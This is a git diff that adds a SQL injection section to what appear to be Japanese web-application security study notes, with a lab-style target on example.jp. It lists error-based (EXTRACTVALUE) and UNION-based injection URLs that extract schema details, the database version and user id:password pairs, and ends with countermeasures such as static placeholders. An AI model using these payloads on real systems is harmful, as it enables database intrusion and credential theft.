@@ -219,6 +219,46 @@ http://example.jp/43/43-001.php?keyword=%3Cscript%3Ealert('alart');%3C/script%3E
 - [教科書に載らない web アプリケーションセキュリティ](https://atmarkit.itmedia.co.jp/fcoding/index/webapp.html)
 
 
+### 4.4 SQL
+
+- 対策
+  - **静的プレースホルダ**を利用して SQL を呼び出す
+
+``` sh
+http://example.jp/44/44-001.php?author=%27+AND+EXTRACTVALUE(0,SELECT%20table_name,%20column_name,%201%20FROM%20information_schema.columns)+--+
+
+
+http://example.jp/44/44-001.php?author=%27+AND+EXTRACTVALUE(0,(SELECT+CONCAT(%27$%27,id,%27:%27,pwd)+FROM+users+LIMIT+0,1))+--+
+
+# MariaDB であることが分かった上で
+
+http://example.jp/44/44-001.php?author=%27+AND+EXTRACTVALUE(0,(SELECT+VERSION()))+--+
+
+http://example.jp/44/44-001.php?author=%27+AND+EXTRACTVALUE(0,(SELECT+GROUP_CONCAT(TABLE_NAME+SEPARATOR+',')+FROM+INFORMATION_SCHEMA.TABLES))+--+
+
+
+http://example.jp/44/44-001.php?author=%27+AND+EXTRACTVALUE(0,(SELECT+CONCAT(%27$%27,GROUP_CONCAT(TABLE_NAME+SEPARATOR+','))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA+NOT+IN+('information_schema',+'mysql',+'performance_schema',+'sys')))+--+
+```
+
+db の表名・列名の調べ方
+
+``` sql
+SELECT table_name, column_name, data_type FROM information_schema.columns ORDER BY 1;
+
+
+http://example.jp/44/44-001.php?author=author=%27+UNION+SELECT+table_name, column_name, data_type,table_schema,NULL,NULL,NULL+FROM+information_schema.columns+ORDER+BY+1--+
+
+
+http://example.jp/44/44-001.php?author=author=%27+UNION+SELECT+table_name, column_name, data_type,NULL,NULL,NULL,NULL+FROM+information_schema.columns+WHERE+table_schema+NOT+IN+('information_schema',+'mysql',+'performance_schema',+'sys')+ORDER+BY+1--+
+```
+
+プレースホルダーの利用に加えてやっておいた方がいい対策
+
+- 詳細なエラーメッセージの抑止
+- 入力値の妥当性検討
+- データベースの権限設定
+
+
 ## Links
 
 - [XMLHttpRequest](https://developer.mozilla.org/ja/docs/Web/API/XMLHttpRequest)
